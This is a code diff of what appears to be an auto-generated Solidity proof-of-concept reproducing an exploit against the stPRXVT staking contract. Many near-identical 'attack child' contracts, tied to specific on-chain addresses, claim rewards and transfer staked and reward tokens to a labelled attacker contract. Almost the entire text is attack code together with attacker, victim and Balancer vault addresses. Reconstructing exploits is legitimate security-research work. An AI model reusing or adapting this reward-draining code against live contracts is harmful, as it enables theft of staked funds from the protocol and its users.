-            _claimRewards(stakingToken, rewardToken, profitRecipient);
+        if (address(this) == 0x19CeEBDD5838C60E73d7557f8950Da0ED0457D8e) {
+            _handleAttackChild4();
             return;
         }
-        if (address(this) == 0x9d1A63c71d88b07524A0F14e5b7aF7671496AF0e) {
-            _claimRewards(stakingToken, rewardToken, profitRecipient);
+        if (address(this) == 0x72CDfF23dB035D4959901158d230c0c8642a38a8) {
+            _handleAttackChild6();
             return;
         }
-        if (address(this) == 0x3731aB4Bf5411E83f0284e977cC957C470b06E05) {
-            _claimRewards(stakingToken, rewardToken, profitRecipient);
+        if (address(this) == 0x9ff99efAd40cD6FF67d7552bBEc5434653FA5349) {
+            _handleAttackChild9();
             return;
         }
-        if (address(this) == 0xE9D0442EBb007735fC6001D2e21203c5E30FcFF2) {
-            _claimRewards(stakingToken, rewardToken, profitRecipient);
-            return;
-        }
-        if (address(this) == 0xbB565626B6107542A07235DaC741082a9A3e1651) {
-            _claimRewards(stakingToken, rewardToken, profitRecipient);
-            return;
-        }
-        if (address(this) == 0xEeB16226B7E9dCD0912A0A3CE4C3d155Bf7187fE) {
-            _claimRewards(stakingToken, rewardToken, profitRecipient);
-            return;
-        }
-        if (address(this) == 0x63cdeC8A4Fe4bae4220732D6BA07Ce4e18257225) {
-            _claimRewards(stakingToken, rewardToken, profitRecipient);
-            return;
-        }
-        if (address(this) == 0x8f328440FEa42b3f5c19eF267b308D928171002A) {
-            _claimRewards(stakingToken, rewardToken, profitRecipient);
-            return;
-        }
-        if (address(this) == 0x67588894D086634BD399F8bC6A8e98399B841083) {
-            _claimRewards(stakingToken, rewardToken, profitRecipient);
-            return;
-        }
-        if (address(this) == 0x83fEF8e277Ae519B6cCB247771704b72679769A9) {
-            _claimRewards(stakingToken, rewardToken, profitRecipient);
-            return;
-        }
-        if (address(this) == 0xB43d98418c5A5863f1a96c2917164d074ff4c97f) {
-            _claimRewards(stakingToken, rewardToken, profitRecipient);
-            return;
-        }
-        if (address(this) == 0x04021252a55fd6E012f96350EB28820FD2f01048) {
-            _claimRewards(stakingToken, rewardToken, profitRecipient);
-            return;
-        }
-        _claimRewards(stakingToken, rewardToken, profitRecipient);
+        _handleAttackChildCa();
         return;
     }
 
@@ -414,172 +891,612 @@ contract AttackChild {
         _entryCb();
     }
 
-    function attackChildCb3() external payable {
-        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
-        return;
-    }
-
-    function attackChildCb20() external payable {
-        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
-        return;
-    }
-
-    function attackChildCb12() external payable {
-        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
-        return;
-    }
-
-    function attackChildCb7() external payable {
-        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
-        return;
-    }
-
-    function attackChildCb4() external payable {
-        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
-        return;
-    }
-
     function attackChildCb10() external payable {
-        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
-        return;
-    }
-
-    function attackChildCb17() external payable {
-        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
-        return;
-    }
-
-    function attackChildCb2() external payable {
-        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
+        _handleAttackChildCa();
         return;
     }
 
     function attackChildCb6() external payable {
-        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
-        return;
-    }
-
-    function attackChildCb14() external payable {
-        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
-        return;
-    }
-
-    function attackChildCb5() external payable {
-        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
-        return;
-    }
-
-    function attackChildCb18() external payable {
-        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
-        return;
-    }
-
-    function attackChildCb16() external payable {
-        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
-        return;
-    }
-
-    function attackChildCb19() external payable {
-        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
-        return;
-    }
-
-    function attackChildCb8() external payable {
-        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
-        return;
-    }
-
-    function attackChildCb13() external payable {
-        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
+        _handleAttackChild7();
         return;
     }
 
     function attackChildCb9() external payable {
-        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
-        return;
-    }
-
-    function attackChildCb11() external payable {
-        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
-        return;
-    }
-
-    function attackChildCb15() external payable {
-        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
+        _handleAttackChild10();
         return;
     }
 
     function attackChildCb() external payable {
-        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
+        _handleAttackChild11();
+        return;
+    }
+
+    function attackChildCb4() external payable {
+        _handleAttackChild5();
+        return;
+    }
+
+    function attackChildCb7() external payable {
+        _handleAttackChild8();
+        return;
+    }
+
+    function attackChildCb2() external payable {
+        _handleAttackChild3();
+        return;
+    }
+
+    function attackChildCb11() external payable {
+        _handleAttackChild2();
+        return;
+    }
+
+    function attackChildCb3() external payable {
+        _handleAttackChild4();
+        return;
+    }
+
+    function attackChildCb5() external payable {
+        _handleAttackChild6();
+        return;
+    }
+
+    function attackChildCb8() external payable {
+        _handleAttackChild9();
         return;
     }
 
     function _entryCb() internal {}
 
-    function _claimRewards(address stakingToken, address rewardToken, address profitRecipient) internal {
-        IstPRXVT(stakingToken).earned(address(this));
-        IstPRXVT(stakingToken).claimReward();
-        IERC20Like(stakingToken).balanceOf(address(this));
-        IERC20Like(stakingToken).transfer(profitRecipient, 2300000000000000000000000);
-        IERC20Like(rewardToken).balanceOf(address(this));
-        IERC20Like(rewardToken).transfer(profitRecipient, 10338296972495607360000);
+    mapping(uint256 => uint256) private _entryCallbackCursor;
+    mapping(address => uint256) private _balancerVaultPreBalance;
+
+    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
+        ordinal = _entryCallbackCursor[index];
+        _entryCallbackCursor[index] = ordinal + 1;
+    }
+
+    function _recordBalancerPre(address[] memory tokens) internal {
+        for (uint256 i = 0; i < tokens.length; i++) {
+            _balancerVaultPreBalance[tokens[i]] =
+                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+        }
+    }
+
+    function recordBalancerPre(address[] memory tokens) external {
+        _recordBalancerPre(tokens);
+    }
+
+    function balancerVaultPreBalance(address token) external view returns (uint256) {
+        return _balancerVaultPreBalance[token];
+    }
+
+    function _tryHelperAt(address target, bytes memory data) internal {
+        (bool ok,) = target.call(data);
+        ok;
+    }
+
+    function _handleAttackChild11() internal {
+        _readPoolState();
+    }
+
+    function _readPoolState() internal {
+        IstPRXVT(Addresses.stPRXVT).earned(address(this));
+        IstPRXVT(Addresses.stPRXVT).claimReward();
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            uint256 transferActionGraphAmount = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        {
+            uint256 transferActionGraphAmount_2 = 178988489719468848000;
+            {
+                if (Addresses.PRXVT.code.length != 0) {
+                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
+                } else {
+                    console2.log(
+                        "PoCWarning",
+                        "skipping missing-code observed typed call",
+                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                    );
+                }
+            }
+        }
     }
 
     function _prepareAttackChild() public {}
-    function _prepareAttackChild1() public {}
+
+    function _handleAttackChild3() internal {
+        _readPoolState2();
+    }
+
+    function _readPoolState2() internal {
+        IstPRXVT(Addresses.stPRXVT).earned(address(this));
+        IstPRXVT(Addresses.stPRXVT).claimReward();
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            uint256 transferActionGraphAmount = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        {
+            uint256 transferActionGraphAmount_2 = 178988489719468848000;
+            {
+                if (Addresses.PRXVT.code.length != 0) {
+                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
+                } else {
+                    console2.log(
+                        "PoCWarning",
+                        "skipping missing-code observed typed call",
+                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                    );
+                }
+            }
+        }
+    }
+
     function _prepareAttackChild2() public {}
+
+    function _handleAttackChild4() internal {
+        _readPoolState3();
+    }
+
+    function _readPoolState3() internal {
+        IstPRXVT(Addresses.stPRXVT).earned(address(this));
+        IstPRXVT(Addresses.stPRXVT).claimReward();
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            uint256 transferActionGraphAmount = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        {
+            uint256 transferActionGraphAmount_2 = 178988489719468848000;
+            {
+                if (Addresses.PRXVT.code.length != 0) {
+                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
+                } else {
+                    console2.log(
+                        "PoCWarning",
+                        "skipping missing-code observed typed call",
+                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                    );
+                }
+            }
+        }
+    }
+
     function _prepareAttackChild3() public {}
+
+    function _handleAttackChild5() internal {
+        _readPoolState4();
+    }
+
+    function _readPoolState4() internal {
+        IstPRXVT(Addresses.stPRXVT).earned(address(this));
+        IstPRXVT(Addresses.stPRXVT).claimReward();
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            uint256 transferActionGraphAmount = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        {
+            uint256 transferActionGraphAmount_2 = 178988489719468848000;
+            {
+                if (Addresses.PRXVT.code.length != 0) {
+                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
+                } else {
+                    console2.log(
+                        "PoCWarning",
+                        "skipping missing-code observed typed call",
+                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                    );
+                }
+            }
+        }
+    }
+
     function _prepareAttackChild4() public {}
+
+    function _handleAttackChild6() internal {
+        _readPoolState5();
+    }
+
+    function _readPoolState5() internal {
+        IstPRXVT(Addresses.stPRXVT).earned(address(this));
+        IstPRXVT(Addresses.stPRXVT).claimReward();
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            uint256 transferActionGraphAmount = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        {
+            uint256 transferActionGraphAmount_2 = 178988489719468848000;
+            {
+                if (Addresses.PRXVT.code.length != 0) {
+                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
+                } else {
+                    console2.log(
+                        "PoCWarning",
+                        "skipping missing-code observed typed call",
+                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                    );
+                }
+            }
+        }
+    }
+
     function _prepareAttackChild5() public {}
+
+    function _handleAttackChild7() internal {
+        _readPoolState6();
+    }
+
+    function _readPoolState6() internal {
+        IstPRXVT(Addresses.stPRXVT).earned(address(this));
+        IstPRXVT(Addresses.stPRXVT).claimReward();
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            uint256 transferActionGraphAmount = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        {
+            uint256 transferActionGraphAmount_2 = 178988489719468848000;
+            {
+                if (Addresses.PRXVT.code.length != 0) {
+                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
+                } else {
+                    console2.log(
+                        "PoCWarning",
+                        "skipping missing-code observed typed call",
+                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                    );
+                }
+            }
+        }
+    }
+
     function _prepareAttackChild6() public {}
+
+    function _handleAttackChild8() internal {
+        _readPoolState7();
+    }
+
+    function _readPoolState7() internal {
+        IstPRXVT(Addresses.stPRXVT).earned(address(this));
+        IstPRXVT(Addresses.stPRXVT).claimReward();
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            uint256 transferActionGraphAmount = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        {
+            uint256 transferActionGraphAmount_2 = 178988489719468848000;
+            {
+                if (Addresses.PRXVT.code.length != 0) {
+                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
+                } else {
+                    console2.log(
+                        "PoCWarning",
+                        "skipping missing-code observed typed call",
+                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                    );
+                }
+            }
+        }
+    }
+
     function _prepareAttackChild7() public {}
+
+    function _handleAttackChild9() internal {
+        _readPoolState8();
+    }
+
+    function _readPoolState8() internal {
+        IstPRXVT(Addresses.stPRXVT).earned(address(this));
+        IstPRXVT(Addresses.stPRXVT).claimReward();
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            uint256 transferActionGraphAmount = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        {
+            uint256 transferActionGraphAmount_2 = 178988489719468848000;
+            {
+                if (Addresses.PRXVT.code.length != 0) {
+                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
+                } else {
+                    console2.log(
+                        "PoCWarning",
+                        "skipping missing-code observed typed call",
+                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                    );
+                }
+            }
+        }
+    }
+
     function _prepareAttackChild8() public {}
+
+    function _handleAttackChild10() internal {
+        _readPoolState9();
+    }
+
+    function _readPoolState9() internal {
+        IstPRXVT(Addresses.stPRXVT).earned(address(this));
+        IstPRXVT(Addresses.stPRXVT).claimReward();
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            uint256 transferActionGraphAmount = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        {
+            uint256 transferActionGraphAmount_2 = 178988489719468848000;
+            {
+                if (Addresses.PRXVT.code.length != 0) {
+                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
+                } else {
+                    console2.log(
+                        "PoCWarning",
+                        "skipping missing-code observed typed call",
+                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                    );
+                }
+            }
+        }
+    }
+
     function _prepareAttackChild9() public {}
+
+    function _handleAttackChildCa() internal {
+        _readPoolState10();
+    }
+
+    function _readPoolState10() internal {
+        IstPRXVT(Addresses.stPRXVT).earned(address(this));
+        IstPRXVT(Addresses.stPRXVT).claimReward();
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            uint256 transferActionGraphAmount = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        {
+            uint256 transferActionGraphAmount_2 = 178988489719468848000;
+            {
+                if (Addresses.PRXVT.code.length != 0) {
+                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
+                } else {
+                    console2.log(
+                        "PoCWarning",
+                        "skipping missing-code observed typed call",
+                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                    );
+                }
+            }
+        }
+    }
+
+    function _prepareAttackChild1() public {}
+
+    function _handleAttackChild2() internal {
+        _readPoolState11();
+    }
+
+    function _readPoolState11() internal {
+        IstPRXVT(Addresses.stPRXVT).earned(address(this));
+        IstPRXVT(Addresses.stPRXVT).claimReward();
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            uint256 transferActionGraphAmount = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        {
+            uint256 transferActionGraphAmount_2 = 178988489719468848000;
+            {
+                if (Addresses.PRXVT.code.length != 0) {
+                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
+                } else {
+                    console2.log(
+                        "PoCWarning",
+                        "skipping missing-code observed typed call",
+                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                    );
+                }
+            }
+        }
+    }
+
     function _prepareAttackChil2() public {}
-    function _prepareAttackChil3() public {}
-    function _prepareAttackChil4() public {}
-    function _prepareAttackChil5() public {}
-    function _prepareAttackChil6() public {}
-    function _prepareAttackChil7() public {}
-    function _prepareAttackChil8() public {}
-    function _prepareAttackChil9() public {}
-    function _prepareAttackChil10() public {}
-    function _prepareAttackChil11() public {}
 }
 
 library Addresses {
     address internal constant ZERO = address(0);
-    address internal constant A_000000_DEAD = 0x000000000000000000000000000000000000dEaD;
-    address internal constant attack_child = 0x04021252a55fd6E012f96350EB28820FD2f01048;
-    address internal constant attack_child_F8F4 = 0x05eB4a38FD088E567c86eC02bDe04564b8CFF8f4;
-    address internal constant attack_child_8754 = 0x1915e1d705A16fb0555183d8035A40B4D7b08754;
-    address internal constant attack_child_4327 = 0x34659264a5772fB78328BC2458aFA602De0c4327;
-    address internal constant attack_child_6E05 = 0x3731aB4Bf5411E83f0284e977cC957C470b06E05;
-    address internal constant attack_child_41C0 = 0x4Ae6813D2303389b4eE340a4203018b7D55A41C0;
-    address internal constant attack_child_EA60 = 0x4B24a672ABEBF0E8d47f4Fff8f48D9372A3EeA60;
-    address internal constant attack_child_7225 = 0x63cdeC8A4Fe4bae4220732D6BA07Ce4e18257225;
-    address internal constant attack_child_1083 = 0x67588894D086634BD399F8bC6A8e98399B841083;
-    address internal constant attack_contract = 0x702980b1Ed754C214B79192a4D7c39106f19BcE9;
-    address internal constant attacker_eoa = 0x7407f9bdc4140d5e284ea7De32A9De6037842f45;
-    address internal constant attack_child_A3C8 = 0x795a89B2FB819643639F47Dd0b664EcdE7d7a3C8;
-    address internal constant AgentTokenV2 = 0x7BaB5D2e3EbdE7293888B3f4c022aAAAD88Ae2db;
-    address internal constant attack_child_69A9 = 0x83fEF8e277Ae519B6cCB247771704b72679769A9;
-    address internal constant attack_child_82C9 = 0x89fbC0aa1934FF7584dB6a947d20B7b9487882C9;
-    address internal constant attack_child_002A = 0x8f328440FEa42b3f5c19eF267b308D928171002A;
-    address internal constant attack_child_AF0E = 0x9d1A63c71d88b07524A0F14e5b7aF7671496AF0e;
-    address internal constant attack_child_C97F = 0xB43d98418c5A5863f1a96c2917164d074ff4c97f;
-    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
-    address internal constant attack_child_1651 = 0xbB565626B6107542A07235DaC741082a9A3e1651;
-    address internal constant PRXVT = 0xC2FF2E5aa9023b1bb688178a4a547212f4614bc0;
-    address internal constant attack_child_9CAE = 0xd8385F89Cd1eb70a51148c01256F2aCA875C9cae;
-    address internal constant stPRXVT = 0xDAc30a5e2612206E2756836Ed6764EC5817e6Fff;
-    address internal constant attack_child_CFF2 = 0xE9D0442EBb007735fC6001D2e21203c5E30FcFF2;
-    address internal constant attack_child_87FE = 0xEeB16226B7E9dCD0912A0A3CE4C3d155Bf7187fE;
-    address internal constant attack_child_410C = 0xF3FE57d25eF1A7E370F0f50a223Cf98a48DB410c;
-    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
+    address internal constant A_000000_DEAD = 0x000000000000000000000000000000000000dEaD; // Addresses.A_000000_DEAD = 0x000000000000000000000000000000000000dead label=unresolved roles=recipient source=unresolved confidence=low
+    address internal constant attack_child = 0x07Cf59f84c0D8aD79dda77F6fA71E19bE08e3242; // Addresses.attack_child = 0x07cf59f84c0d8ad79dda77f6fa71e19be08e3242 label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
+    address internal constant attack_child_21A6 = 0x10318e391bA9Dfb517f7d0f521Bf2691d32821A6; // Addresses.attack_child_21A6 = 0x10318e391ba9dfb517f7d0f521bf2691d32821a6 label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
+    address internal constant attack_child_7D8E = 0x19CeEBDD5838C60E73d7557f8950Da0ED0457D8e; // Addresses.attack_child_7D8E = 0x19ceebdd5838c60e73d7557f8950da0ed0457d8e label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
+    address internal constant attack_child_F368 = 0x25c9ca5e593553c696EBB09ED675b0f09B5Ef368; // Addresses.attack_child_F368 = 0x25c9ca5e593553c696ebb09ed675b0f09b5ef368 label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
+    address internal constant attack_contract = 0x702980b1Ed754C214B79192a4D7c39106f19BcE9; // Addresses.attack_contract = 0x702980b1ed754c214b79192a4d7c39106f19bce9 label=attack_contract roles=asset|attacker_contract|attacker_entry_contract|code_contract|contract|economic_holder|localized_contract|attack_address|profit_holder|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
+    address internal constant attack_child_38A8 = 0x72CDfF23dB035D4959901158d230c0c8642a38a8; // Addresses.attack_child_38A8 = 0x72cdff23db035d4959901158d230c0c8642a38a8 label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
